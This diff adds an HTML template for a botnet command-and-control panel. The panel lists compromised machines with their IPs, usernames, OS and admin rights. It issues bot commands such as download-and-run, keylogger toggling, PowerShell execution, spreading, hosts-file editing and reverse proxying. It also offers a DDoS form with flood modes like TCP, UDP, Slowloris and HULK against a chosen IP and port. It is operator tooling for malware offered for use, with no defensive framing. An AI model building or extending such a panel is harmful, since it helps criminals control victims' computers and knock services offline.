@@ -1,0 +1,167 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Botnet C&C: Control Panel</title>
+
+    <link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.6.0/pure-min.css">
+	<script src="https://use.fontawesome.com/e3e6a398df.js"></script>
+	
+	<style>
+body {
+  background: #76b852; /* fallback for old browsers */
+  background: -webkit-linear-gradient(right, #76b852, #8DC26F);
+  background: -moz-linear-gradient(right, #76b852, #8DC26F);
+  background: -o-linear-gradient(right, #76b852, #8DC26F);
+  background: linear-gradient(to left, #76b852, #8DC26F);
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;      
+}
+        .button-success,
+        .button-error,
+        .button-warning,
+        .button-secondary {
+            color: white;
+            border-radius: 4px;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+        .button-success {
+            background: rgb(28, 184, 65); /* this is a green */
+        }
+        .button-error {
+            background: rgb(202, 60, 60); /* this is a maroon */
+        }
+        .button-warning {
+            background: rgb(223, 117, 20); /* this is an orange */
+        }
+        .button-secondary {
+            background: rgb(66, 184, 221); /* this is a light blue */
+        }
+		  * { margin: 0; padding: 0; }
+	   p { padding: 10px; }
+	   #left { position: absolute; left: 0;  width: 50%; }
+	   #right { position: absolute; right: 0;  width: 50%; }
+</style>
+</head>
+<body>
+<div class="pure-menu pure-menu-horizontal" align="center">
+    <ul class="pure-menu-list">
+	<span class="pure-menu-heading" align="left">Botnet C&C</span>
+        <li class="pure-menu-item pure-menu-selected"><a href="./panel" class="pure-menu-link">Control Panel</a></li>
+		<li class="pure-menu-item pure-menu-selected"><a href="./files" class="pure-menu-link">File Browser</a></li>
+		<li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            <a id="menuLink1" class="pure-menu-link">User Managment</a>
+            <ul class="pure-menu-children">
+                <li class="pure-menu-item"><a href="./logout" class="pure-menu-link">Logout</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+<br>
+<br>
+<div align="center"><h2>Control Panel</h2></div>
+<br>
+{STATS}
+<br>
+<form class="pure-form" method="POST" action="./sendcmd">
+<div align="center">
+<table class="pure-table" align="center">
+    <thead>
+        <tr>
+			<th></th>
+            <th>GUID</th>
+            <th>IP</th>
+            <th>WHO AM I</th>
+            <th>OS</th>
+			<th>ADMIN RIGHTS</th>
+			<th>LAST CHECK-IN</th>
+			<th></th>
+        </tr>
+    </thead>
+   {RAWTABLE}
+</table>
+<br>
+<div id="left" align="center">
+	<a class="button-success pure-button" href="?page={BACK}"><i class="fa fa-arrow-left fa-lg"></i>  Previous</a>
+</div>
+<div id="right" align="center">
+	<a class="button-success pure-button" href="?page={NEXT}">Next  <i class="fa fa-arrow-right fa-lg"></i></a>
+</div>
+</div>
+<br>
+<br>
+<br>
+<div id="right" align="center">
+    <fieldset class="pure-group">
+	<legend>Command</legend>
+         <select id="botsselection" name="botsselection" class="pure-input-1-2">
+                    <option value="000">All</option>
+                    <option value="selected">Selected</option>
+                </select>
+        <select id="commandtype" name="commandtype" class="pure-input-1-2">
+                    <option value="0x1">Open URL</option>
+                    <option value="0x2">Run Application</option>
+					<option value="0x5">Download and Run</option>
+					<option value="2x4">Enable/Disable Keylogger</option>
+					<option value="0x0">Kill Me</option>
+					<option value="0x6">Run Powershell</option>
+					<option value="0x7">Spreader</option>
+					<option value="0x8">Start Webserver</option>
+					<option value="0x9">Edit Webserver Page</option>
+					<option value="1x0">Hide Process Window</option>
+					<option value="1x1">Seed Torrent</option>
+					<option value="1x2">System Power Options</option>
+					<option value="1x3">Set Homepage</option>
+					<option value="1x4">Set Wallpaper</option>
+					<option value="1x5">Edit HOST File</option>
+					<option value="1x6">Uninstall Me</option>
+					<option value="1x7">Open Port</option>
+					<option value="1x8">Run Script</option>
+					<option value="1x9">Run Command</option>
+					<option value="2x0">Enable Reverse Proxy Server</option>
+					<option value="2x1">Push File to Client</option>
+					<option value="2x2">Kill Process</option>
+					<option value="2x3">Update Client</option>
+                </select>
+    </fieldset>
+
+    <fieldset class="pure-group">
+        <textarea id="arg1" name="arg1" class="pure-input-1-2" placeholder="Arguments"></textarea>
+		<br>
+		 Use '|' to split Arguments
+    </fieldset>
+
+    <button type="submit" class="pure-button pure-input-1-2 pure-button-primary"><i class="fa fa-podcast fa-lg"></i>  Send Command</button> <a class="button-secondary pure-button" href="./refresh?guid={GUID}"><i class="fa fa-refresh fa-lg"></i>  Refresh Info</a>
+</form>
+</div>
+<div id="left" align="center">
+<form class="pure-form" method="POST" action="./cmdddos">
+<fieldset class="pure-group">
+<legend>DDoS Attack</legend>
+         <select id="ddosmode" name="ddosmode" class="pure-input-1-2">
+                    <option value="0">HTTP Get</option>
+                    <option value="5">TCP Flood</option>
+					<option value="4">UDP Flood</option>
+					<option value="1">Slowloris</option>
+					<option value="2">HULK</option>
+					<option value="3">TLS Flood</option>
+					<option value="7">Bandwidth Drain</option>
+					<option value="6">Golden Eye</option>
+					<option value="8">Ace</option>
+                </select>
+				</fieldset>
+        <input type="text" name="ip" class="pure-input-1-2" placeholder="127.0.0.1">
+        <input type="text" name="port" class="pure-input-1-2" placeholder="80">
+		<fieldset class="pure-group">
+        <input type="text" name="threads" class="pure-input-1-2" placeholder="Threads 1000">
+		<input type="text" name="interval" class="pure-input-1-2" placeholder="Interval 500 * Milliseconds">
+		<br>
+		 DDoS Attacks utilize all bots
+		</fieldset>
+    <button type="submit" class="pure-button pure-input-1-2 pure-button-primary"><i class="fa fa-podcast fa-lg"></i>  Send Command</button> <a class="button-error pure-button" href="./stopddos"><i class="fa fa-stop fa-lg"></i>  Stop Attack</a>
+</div>
+</form>
+
+</body>
